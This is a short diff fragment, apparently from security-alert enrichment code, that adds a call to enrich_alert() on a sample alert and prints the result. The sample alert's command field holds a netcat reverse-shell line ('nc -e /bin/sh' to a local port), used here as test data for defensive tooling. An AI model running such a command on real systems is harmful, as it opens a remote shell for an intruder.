@@ -38,4 +38,7 @@ alert = {
         "command": "nc -e /bin/sh 127.0.0.1 5555"
     }
 }
+
+result = enrich_alert(alert, os_type="linux")
+print(result)
 ```
